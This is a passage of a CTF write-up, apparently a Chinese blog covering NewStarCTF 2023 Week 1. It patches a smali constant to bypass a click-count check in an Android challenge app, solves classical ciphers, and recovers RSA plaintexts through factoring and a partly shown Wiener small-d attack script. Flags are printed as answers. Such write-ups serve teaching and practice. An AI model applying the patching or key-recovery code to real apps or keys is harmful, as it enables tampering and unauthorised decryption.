class="hljs-string">&quot;androidx.core.app.CoreComponentFactory&quot;</span> <span class="hljs-attr">android:dataExtractionRules</span>=<span class="hljs-string">&quot;@xml/data_extraction_rules&quot;</span> <span class="hljs-attr">android:fullBackupContent</span>=<span class="hljs-string">&quot;@xml/backup_rules&quot;</span> <span class="hljs-attr">android:icon</span>=<span class="hljs-string">&quot;@mipmap/ic_launcher&quot;</span> <span class="hljs-attr">android:label</span>=<span class="hljs-string">&quot;@string/app_name&quot;</span> <span class="hljs-attr">android:roundIcon</span>=<span class="hljs-string">&quot;@mipmap/ic_launcher_round&quot;</span> <span class="hljs-attr">android:supportsRtl</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">android:theme</span>=<span class="hljs-string">&quot;@style/Theme.Activity_Travel&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">activity</span> <span class="hljs-attr">android:exported</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;com.droidlearn.activity_travel.FlagActivity&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">category</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">activity</span> <span class="hljs-attr">android:exported</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;com.droidlearn.activity_travel.MainActivity&quot;</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">activity</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">application</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">manifest</span>&gt;</span><br></code></pre></td></tr></table></figure><p>重新编译后打开，发现要求点击按钮10000次才能获得flag。</p><p>分析smali语句</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs java">.<span class="hljs-keyword">class</span> <span class="hljs-title class_">Lcom</span>/droidlearn/activity_travel/FlagActivity$<span class="hljs-number">1</span>;<br>.<span class="hljs-built_in">super</span> Ljava/lang/Object;<br>.source <span class="hljs-string">&quot;FlagActivity.java&quot;</span><br><br># interfaces<br>.<span class="hljs-keyword">implements</span> <span class="hljs-title class_">Landroid</span>/view/View$OnClickListener;<br><br><br># annotations<br>.annotation system Ldalvik/annotation/EnclosingMethod;<br>    value = Lcom/droidlearn/activity_travel/FlagActivity;-&gt;onCreate(Landroid/os/Bundle;)V<br>.end annotation<br><br>.annotation system Ldalvik/annotation/InnerClass;<br>    accessFlags = <span class="hljs-number">0x0</span><br>    name = <span class="hljs-literal">null</span><br>.end annotation<br><br><br># instance fields<br>.field <span class="hljs-keyword">final</span> synthetic <span class="hljs-built_in">this</span>$<span class="hljs-number">0</span>:Lcom/droidlearn/activity_travel/FlagActivity;<br><br>.field <span class="hljs-keyword">final</span> synthetic val$str:Landroid/widget/EditText;<br><br>.field <span class="hljs-keyword">final</span> synthetic val$tv_cnt:Landroid/widget/TextView;<br><br><br># direct methods<br>.method constructor &lt;init&gt;(Lcom/droidlearn/activity_travel/FlagActivity;Landroid/widget/TextView;Landroid/widget/EditText;)V<br>    .locals <span class="hljs-number">0</span><br><br>    .line <span class="hljs-number">20</span><br>    iput-object p1, p0, Lcom/droidlearn/activity_travel/FlagActivity$<span class="hljs-number">1</span>;-&gt;<span class="hljs-built_in">this</span>$<span class="hljs-number">0</span>:Lcom/droidlearn/activity_travel/FlagActivity;<br><br>    iput-object p2, p0, Lcom/droidlearn/activity_travel/FlagActivity$<span class="hljs-number">1</span>;-&gt;val$tv_cnt:Landroid/widget/TextView;<br><br>    iput-object p3, p0, Lcom/droidlearn/activity_travel/FlagActivity$<span class="hljs-number">1</span>;-&gt;val$str:Landroid/widget/EditText;<br><br>    invoke-direct &#123;p0&#125;, Ljava/lang/Object;-&gt;&lt;init&gt;()V<br><br>    <span class="hljs-keyword">return</span>-<span class="hljs-keyword">void</span><br>.end method<br><br><br># virtual methods<br>.method <span class="hljs-keyword">public</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(Landroid/view/View;)</span>V<br>    .locals <span class="hljs-number">2</span><br><br>    .line <span class="hljs-number">23</span><br>    iget-object p1, p0, Lcom/droidlearn/activity_travel/FlagActivity$<span class="hljs-number">1</span>;-&gt;val$tv_cnt:Landroid/widget/TextView;<br><br>    iget-object v0, p0, Lcom/droidlearn/activity_travel/FlagActivity$<span class="hljs-number">1</span>;-&gt;<span class="hljs-built_in">this</span>$<span class="hljs-number">0</span>:Lcom/droidlearn/activity_travel/FlagActivity;<br><br>    invoke-<span class="hljs-keyword">static</span> &#123;v0&#125;, Lcom/droidlearn/activity_travel/FlagActivity;-&gt;access$<span class="hljs-number">004</span>(Lcom/droidlearn/activity_travel/FlagActivity;)I<br><br>    move-result v0<br><br>    invoke-<span class="hljs-keyword">static</span> &#123;v0&#125;, Ljava/lang/Integer;-&gt;toString(I)Ljava/lang/String;<br><br>    move-result-object v0<br><br>    invoke-virtual &#123;p1, v0&#125;, Landroid/widget/TextView;-&gt;setText(Ljava/lang/CharSequence;)V<br><br>    .line <span class="hljs-number">24</span><br>    iget-object p1, p0, Lcom/droidlearn/activity_travel/FlagActivity$<span class="hljs-number">1</span>;-&gt;<span class="hljs-built_in">this</span>$<span class="hljs-number">0</span>:Lcom/droidlearn/activity_travel/FlagActivity;<br><br>    invoke-<span class="hljs-keyword">static</span> &#123;p1&#125;, Lcom/droidlearn/activity_travel/FlagActivity;-&gt;access$<span class="hljs-number">000</span>(Lcom/droidlearn/activity_travel/FlagActivity;)I<br><br>    move-result p1<br><br>    const/<span class="hljs-number">16</span> v0, <span class="hljs-number">0x2710</span><br><br>    <span class="hljs-keyword">if</span>-lt p1, v0, :cond_0<br><br>    .line <span class="hljs-number">25</span><br>    iget-object p1, p0, Lcom/droidlearn/activity_travel/FlagActivity$<span class="hljs-number">1</span>;-&gt;<span class="hljs-built_in">this</span>$<span class="hljs-number">0</span>:Lcom/droidlearn/activity_travel/FlagActivity;<br><br>    iget-object v0, p0, Lcom/droidlearn/activity_travel/FlagActivity$<span class="hljs-number">1</span>;-&gt;val$str:Landroid/widget/EditText;<br><br>    invoke-virtual &#123;v0&#125;, Landroid/widget/EditText;-&gt;getText()Landroid/text/Editable;<br><br>    move-result-object v0<br><br>    invoke-virtual &#123;v0&#125;, Ljava/lang/Object;-&gt;toString()Ljava/lang/String;<br><br>    move-result-object v0<br><br>    const/<span class="hljs-number">4</span> v1, <span class="hljs-number">0x0</span><br><br>    invoke-<span class="hljs-keyword">static</span> &#123;p1, v0, v1&#125;, Landroid/widget/Toast;-&gt;makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;<br><br>    move-result-object p1<br><br>    invoke-virtual &#123;p1&#125;, Landroid/widget/Toast;-&gt;show()V<br><br>    :cond_0<br>    <span class="hljs-keyword">return</span>-<span class="hljs-keyword">void</span><br>.end method<br><br></code></pre></td></tr></table></figure><p>发现其中的<code>const/16 v0, 0x2710</code>，其存储为点击次数，将其改为0x1，重新编译安装，打开后点击按钮直接得到flag</p><img src="/2023/09/26/2023newstarctfWeek1/apkre.png" class=""><p><code>flag&#123;Act1v1ty_!s_so00oo0o_lmpor#an#&#125;</code></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>解题 10&#x2F;10</p><h3 id="brainfuck"><a href="#brainfuck" class="headerlink" title="brainfuck"></a>brainfuck</h3><p>下载附件，得到</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-literal">++++++++</span><span class="hljs-title">[</span>&gt;&gt;<span class="hljs-literal">++</span>&gt;<span class="hljs-literal">++++</span>&gt;<span class="hljs-literal">++++++</span>&gt;<span class="hljs-literal">++++++++</span>&gt;<span class="hljs-literal">++++++++++</span>&gt;<span class="hljs-literal">++++++++++++</span>&gt;<span class="hljs-literal">++++++++++++++</span>&gt;<span class="hljs-literal">++++++++++++++++</span>&gt;<span class="hljs-literal">++++++++++++++++++</span>&gt;<span class="hljs-literal">++++++++++++++++++++</span>&gt;<span class="hljs-literal">++++++++++++++++++++++</span>&gt;<span class="hljs-literal">++++++++++++++++++++++++</span>&gt;<span class="hljs-literal">++++++++++++++++++++++++++</span>&gt;<span class="hljs-literal">++++++++++++++++++++++++++++</span>&gt;<span class="hljs-literal">++++++++++++++++++++++++++++++</span>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;<span class="hljs-literal">-</span><span class="hljs-title">]</span>&gt;&gt;&gt;&gt;&gt;&gt;&gt;<span class="hljs-literal">++++++</span><span class="hljs-string">.</span>&gt;<span class="hljs-literal">----</span><span class="hljs-string">.</span>&lt;<span class="hljs-literal">-----</span><span class="hljs-string">.</span>&gt;<span class="hljs-literal">-----</span><span class="hljs-string">.</span>&gt;<span class="hljs-literal">-----</span><span class="hljs-string">.</span>&lt;&lt;&lt;<span class="hljs-literal">-</span><span class="hljs-string">.</span>&gt;&gt;<span class="hljs-literal">++</span><span class="hljs-string">.</span><span class="hljs-string">.</span>&lt;<span class="hljs-string">.</span>&gt;<span class="hljs-string">.</span><span class="hljs-literal">++++++</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">------</span><span class="hljs-string">.</span>&lt;<span class="hljs-string">.</span>&gt;<span class="hljs-string">.</span>&lt;&lt;&lt;&lt;&lt;<span class="hljs-literal">+++</span><span class="hljs-string">.</span>&gt;&gt;&gt;&gt;<span class="hljs-literal">+</span><span class="hljs-string">.</span>&lt;&lt;&lt;<span class="hljs-literal">+++++++</span><span class="hljs-string">.</span>&gt;&gt;&gt;<span class="hljs-literal">+</span><span class="hljs-string">.</span>&lt;&lt;&lt;<span class="hljs-literal">-------</span><span class="hljs-string">.</span>&gt;&gt;&gt;<span class="hljs-literal">-</span><span class="hljs-string">.</span>&lt;&lt;&lt;<span class="hljs-literal">+</span><span class="hljs-string">.</span><span class="hljs-literal">+++++++</span><span class="hljs-string">.</span><span class="hljs-literal">--</span><span class="hljs-string">.</span><span class="hljs-string">.</span>&gt;&gt;&gt;&gt;<span class="hljs-literal">---</span><span class="hljs-string">.</span><span class="hljs-literal">-</span><span class="hljs-string">.</span>&lt;&lt;&lt;&lt;<span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-literal">+++</span><span class="hljs-string">.</span>&gt;&gt;&gt;&gt;<span class="hljs-string">.</span>&lt;&lt;&lt;&lt;<span class="hljs-literal">-------</span><span class="hljs-string">.</span><span class="hljs-literal">+</span><span class="hljs-string">.</span>&gt;&gt;&gt;&gt;&gt;<span class="hljs-literal">++</span><span class="hljs-string">.</span><br></code></pre></td></tr></table></figure><p><a href="https://ctf.bugku.com/tool/brainfuck">Brainfuck&#x2F;OoK加密解密 - Bugku CTF</a>，解密一下，得到flag：<code>flag&#123;Oiiaioooooiai#b7c0b1866fe58e12&#125;</code></p><h3 id="Caesar’s-Secert"><a href="#Caesar’s-Secert" class="headerlink" title="Caesar’s Secert"></a>Caesar’s Secert</h3><p>打开附件，得到<code>kqfl&#123;hf3x4w&#39;x_h1umjw_n5_a4wd_3fed&#125;</code></p><p>凯撒枚举<a href="https://ctf.bugku.com/tool/caesar">凯撒(Caesar)加密&#x2F;解密 - Bugku CTF</a>，得到flag：<code>flag&#123;ca3s4r&#39;s_c1pher_i5_v4ry_3azy&#125;</code></p><h3 id="Fence"><a href="#Fence" class="headerlink" title="Fence"></a>Fence</h3><p>附件内容：<code>fa&#123;ereigtepanet6680&#125;lgrodrn_h_litx#8fc3</code></p><p>栅栏加密<a href="https://ctf.bugku.com/tool/railfence">栅栏加密&#x2F;解密 - Bugku CTF</a>，枚举解密，得到flag：<code>flag&#123;reordering_the_plaintext#686f8c03&#125;</code></p><h3 id="Vigenere"><a href="#Vigenere" class="headerlink" title="Vigenère"></a>Vigenère</h3><p>附件：<code>pqcq&#123;qc_m1kt4_njn_5slp0b_lkyacx_gcdy1ud4_g3nv5x0&#125;</code></p><p>维吉尼亚解密<a href="https://ctf.bugku.com/tool/vigenere">维吉尼亚加密&#x2F;解密 - Bugku CTF</a>，密钥用flag前4个字母尝试一下得到：KFC</p><p>得到flag：<code>flag&#123;la_c1fr4_del_5ign0r_giovan_batt1st4_b3ll5s0&#125;</code></p><h3 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h3><p>打开附件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_prime</span>(<span class="hljs-params">n</span>):<br>    res = <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>):<br>        res *= getPrime(n)<br><br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    n = gen_prime(<span class="hljs-number">32</span>)<br>    e = <span class="hljs-number">65537</span><br>    m = bytes_to_long(flag)<br>    c = <span class="hljs-built_in">pow</span>(m,e,n)<br>    <span class="hljs-built_in">print</span>(n)<br>    <span class="hljs-built_in">print</span>(c)<br><span class="hljs-comment"># 17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261</span><br><span class="hljs-comment"># 14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595</span><br></code></pre></td></tr></table></figure><p>使用大整数分解网站<a href="http://www.factordb.com/index.php?id=1100000004708746782">factordb.com</a>，将其分解为多个质数之积</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1729006607</span>...<span class="hljs-number">61</span>&lt;<span class="hljs-number">143</span>&gt; = <span class="hljs-number">2217990919</span>&lt;<span class="hljs-number">10</span>&gt; · <span class="hljs-number">2338725373</span>&lt;<span class="hljs-number">10</span>&gt; · <span class="hljs-number">2370292207</span>&lt;<span class="hljs-number">10</span>&gt; · <span class="hljs-number">2463878387</span>&lt;<span class="hljs-number">10</span>&gt; · <span class="hljs-number">2706073949</span>&lt;<span class="hljs-number">10</span>&gt; · <span class="hljs-number">2794985117</span>&lt;<span class="hljs-number">10</span>&gt; · <span class="hljs-number">2804303069</span>&lt;<span class="hljs-number">10</span>&gt; · <span class="hljs-number">2923072267</span>&lt;<span class="hljs-number">10</span>&gt; · <span class="hljs-number">2970591037</span>&lt;<span class="hljs-number">10</span>&gt; · <span class="hljs-number">3207148519</span>&lt;<span class="hljs-number">10</span>&gt; · <span class="hljs-number">3654864131</span>&lt;<span class="hljs-number">10</span>&gt; · <span class="hljs-number">3831680819</span>&lt;<span class="hljs-number">10</span>&gt; · <span class="hljs-number">3939901243</span>&lt;<span class="hljs-number">10</span>&gt; · <span class="hljs-number">4093178561</span>&lt;<span class="hljs-number">10</span>&gt; · <span class="hljs-number">4278428893</span>&lt;<span class="hljs-number">10</span>&gt;<br></code></pre></td></tr></table></figure><p>解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> inverse<br><br>n = <span class="hljs-number">2217990919</span> * <span class="hljs-number">2338725373</span> * <span class="hljs-number">2370292207</span> * <span class="hljs-number">2463878387</span> * <span class="hljs-number">2706073949</span> * <span class="hljs-number">2794985117</span> * <span class="hljs-number">2804303069</span> * <span class="hljs-number">2923072267</span> * <span class="hljs-number">2970591037</span> * <span class="hljs-number">3207148519</span> * <span class="hljs-number">3654864131</span> * <span class="hljs-number">3831680819</span> * <span class="hljs-number">3939901243</span> * <span class="hljs-number">4093178561</span> * <span class="hljs-number">4278428893</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595</span><br><br><span class="hljs-comment"># 尝试分解 n</span><br>factors = [<span class="hljs-number">2217990919</span>, <span class="hljs-number">2338725373</span>, <span class="hljs-number">2370292207</span>, <span class="hljs-number">2463878387</span>, <span class="hljs-number">2706073949</span>, <span class="hljs-number">2794985117</span>, <span class="hljs-number">2804303069</span>, <span class="hljs-number">2923072267</span>, <span class="hljs-number">2970591037</span>, <span class="hljs-number">3207148519</span>, <span class="hljs-number">3654864131</span>, <span class="hljs-number">3831680819</span>, <span class="hljs-number">3939901243</span>, <span class="hljs-number">4093178561</span>, <span class="hljs-number">4278428893</span>]<br><br><span class="hljs-comment"># 计算 phi(n)</span><br>phi_n = <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> factor <span class="hljs-keyword">in</span> factors:<br>    phi_n *= (factor - <span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># 计算私钥 d</span><br>d = inverse(e, phi_n)<br><br><span class="hljs-comment"># 解密密文得到明文</span><br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><br><span class="hljs-comment"># 将明文转换为字节形式</span><br>flag = m.to_bytes((m.bit_length() + <span class="hljs-number">7</span>) // <span class="hljs-number">8</span>, <span class="hljs-string">&#x27;big&#x27;</span>)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h3 id="Small-d"><a href="#Small-d" class="headerlink" title="Small d"></a>Small d</h3><p>打开附件py代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getPrime(<span class="hljs-number">1024</span>)<br><br>d = getPrime(<span class="hljs-number">32</span>)<br>e = inverse(d, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>n = p*q<br>m = bytes_to_long(flag)<br><br>c = <span class="hljs-built_in">pow</span>(m,e,n)<br><br><span class="hljs-built_in">print</span>(c)<br><span class="hljs-built_in">print</span>(e)<br><span class="hljs-built_in">print</span>(n)<br><br><span class="hljs-comment"># c = 6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248</span><br><span class="hljs-comment"># e = 8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825</span><br><span class="hljs-comment"># n = 19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433</span><br></code></pre></td></tr></table></figure><p>看到d数值比较小，使用低解密指数攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rational_to_contfrac</span>(<span class="hljs-params">x,y</span>):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    Converts a rational x/y fraction into</span><br><span class="hljs-string">    a list of partial quotients [a0, ..., an]</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    a = x//y<br>    pquotients = [a]<br>    <span class="hljs-keyword">while</span> a * y != x:<br>        x,y = y,x-a*y<br>        a = x//y<br>        pquotients.append(a)<br>    <span class="hljs-keyword">return</span> pquotients<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">convergents_from_contfrac</span>(<span class="hljs-params">frac</span>):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    computes the list of convergents</span><br><span class="hljs-string">    using the list of partial quotients</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    convs = [];<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(frac)):<br>        convs.append(contfrac_to_rational(frac[<span class="hljs-number">0</span>:i]))<br>    <span class="hljs-keyword">return</span> convs<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">contfrac_to_rational</span> (frac):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;Converts a finite continued fraction [a0, ..., an]</span><br><span class="hljs-string">     to an x/y rational.</span><br><span class="hljs-string">     &#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(frac) == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> (<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)<br>    num = frac[-<span class="hljs-number">1</span>]<br>    denom = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(-<span class="hljs-number">2</span>,-<span class="hljs-built_in">len</span>(frac)-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        num, denom = frac[_]*num+denom, num<br> 